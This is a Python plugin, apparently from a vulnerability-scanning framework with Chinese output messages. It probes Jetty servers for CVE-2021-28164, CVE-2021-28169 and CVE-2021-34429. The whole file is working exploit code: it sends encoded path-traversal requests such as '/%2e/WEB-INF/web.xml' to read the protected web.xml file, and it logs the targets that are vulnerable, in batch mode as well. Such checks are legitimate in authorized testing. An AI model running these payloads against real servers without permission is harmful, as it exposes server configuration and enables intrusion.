#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class Cve_2021_28164:
    def run(self,base_url):
        try:
            url = base_url + "/%2e/WEB-INF/web.xml"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)

            if req.status_code == 200:
                OutPrintInfoSuc("Jetty",f"存在CVE-2021-28164路径限制绕过漏洞{url}")
                if self.batch:
                    OutPutFile("jetty_2021_28164.txt",f"存在CVE-2021-28164路径限制绕过漏洞{url}")

            else:
                if not self.batch:
                    OutPrintInfo("Jetty", "不存在CVE-2021-28164路径限制绕过漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Jetty","目标访问出错")
    def run2(self,base_url):
        try:
            url = base_url + "/noexist/%2e%2e/WEB-INF/web.xml"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if req.status_code == 200:
                OutPrintInfoSuc("Jetty", f"存在CVE-2021-28164路径限制绕过漏洞{url}")
                if self.batch:
                    OutPutFile("jetty_2021_28164.txt", f"存在CVE-2021-28164路径限制绕过漏洞{url}")
            else:
                if not self.batch:
                    OutPrintInfo("Jetty", "不存在CVE-2021-28164路径限制绕过漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Jetty", "目标访问出错")
    def run3(self,base_url):
        try:
            url = base_url + "/static?/%2557EB-INF/web.xml"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if req.status_code == 200:
                OutPrintInfoSuc("Jetty", f"存在CVE-2021-28169路径限制绕过漏洞{url}")

                if self.batch:
                    OutPutFile("jetty_2021_28164.txt", f"存在CVE-2021-28169路径限制绕过漏洞{url}")
            else:
                if not self.batch:
                    OutPrintInfo("Jetty", "不存在CVE-2021-28169路径限制绕过漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Jetty", "目标访问出错")
    def run4(self,base_url):
        try:
            url = base_url + "/%u002e/WEB-INF/web.xml"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if req.status_code == 200:
                OutPrintInfoSuc("Jetty", f"存在CVE-2021-34429敏感信息泄露漏洞{url}")

                if self.batch:
                    OutPutFile("jetty_2021_28164.txt", f"存在CVE-2021-34429敏感信息泄露漏洞{url}")
            else:
                if not self.batch:
                    OutPrintInfo("Jetty", "不存在CVE-2021-34429敏感信息泄露漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Jetty", "目标访问出错")

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]

        header = target["header"]
        proxy = target["proxy"]

        self.timeout = int(target["timeout"])

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Jetty", "开始检测CVE-2021-28164路径限制绕过漏洞...")
            OutPrintInfo("Jetty", "开始检测CVE-2021-28164-POC-1路径限制绕过漏洞...")
        self.run(url)
        if not self.batch:
            OutPrintInfo("Jetty", "开始检测CVE-2021-28164-POC-2路径限制绕过漏洞...")
        self.run2(url)
        if not self.batch:
            OutPrintInfo("Jetty", "CVE-2021-28164路径限制绕过漏洞检测结束")
            OutPrintInfo("Jetty", "开始检测CVE-2021-28169路径限制绕过漏洞...")
        self.run3(url)
        if not self.batch:
            OutPrintInfo("Jetty", "CVE-2021-28169路径限制绕过漏洞检测结束")

            OutPrintInfo("Jetty", "开始检测CVE-2021-34429敏感信息泄露漏洞...")
        self.run4(url)
        if not self.batch:
            OutPrintInfo("Jetty", "CVE-2021-34429敏感信息泄露漏洞检测结束")

